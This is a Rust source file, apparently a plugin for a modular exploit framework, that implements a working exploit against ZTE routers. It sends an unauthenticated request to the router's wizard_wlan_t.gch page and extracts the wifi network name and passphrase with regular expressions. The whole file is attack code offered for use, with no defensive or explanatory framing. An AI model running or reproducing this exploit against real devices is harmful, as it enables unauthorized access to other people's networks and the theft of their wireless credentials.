use std::collections::HashMap;
use anyhow::{ Result, anyhow };
use regex::Regex;
use colored::Colorize;

pub trait Module {
    fn help(&self) -> String;
    fn run(&self) -> Result<()>;
    fn options(&self) -> Vec<(String, String, bool)>;
    fn set(&mut self, k: String, v: String);
    fn get(&self, k: String) -> String;
}

struct ExploitZTEWifiDisclosure(HashMap<String, String>);

#[no_mangle]
pub fn get_plugin() -> Box<dyn Module> {
    Box::new(ExploitZTEWifiDisclosure (
        [
            ("rport".to_owned(), "80".to_owned()),
        ].into_iter().collect()
    ))
}

impl Module for ExploitZTEWifiDisclosure {
    fn run(&self) -> Result<()> {
        if self.0.get("rhost") == None {
            return Err(anyhow!("exploit failed: {}", "rhost was not set.".bold()));
        }

        println!("{} {}", "*".red().bold(), "Dispatching ZTE router wifi password disclosure exploit".green().bold());

        let resp = ureq::get(
            format!("http://{}:{}/wizard_wlan_t.gch", self.0.get("rhost").unwrap(), self.0.get("rport").unwrap()).as_str()
        ).call()?.into_string()?;

        let ssid_re = Regex::new("Transfer_meaning\\('ESSID','(.*?)'\\);")?;
        let pass_re = Regex::new("Transfer_meaning\\('KeyPassphrase','(.*?)'\\);")?;

        for (_, [ssid]) in ssid_re.captures_iter(&resp).map(|c| c.extract()) {
            if ssid != "" { println!("   {}: {}", "ESSID".underline().bold(), ssid.blue().bold()); }
        }

        for (_, [pass]) in pass_re.captures_iter(&resp).map(|c| c.extract()) {
            if pass != "" { println!("   {}: {}", "PASSW".underline().bold(), pass.red().bold()); }
        }

        Ok(())
    }
    
    fn set(&mut self, key: String, val: String) {
        self.0.insert(key, val);
    }

    fn get(&self, key: String) -> String {
        if let Some(val) = self.0.get(&key) { val.clone() }
        else { "null".to_owned() }
    }

    fn options(&self) -> Vec<(String, String, bool)> {
        vec![
            ("rport", "remote target port", true),
            ("rhost", "remote target host", false),
        ].into_iter().map(|(k, v, o)| (k.to_owned(), v.to_owned(), o)).collect()
    }

    fn help(&self) -> String {
        "Exploit that targets ZTE routers' unauthorized wifi password disclosure vulnerability".blue().underline().to_string()
    }
}
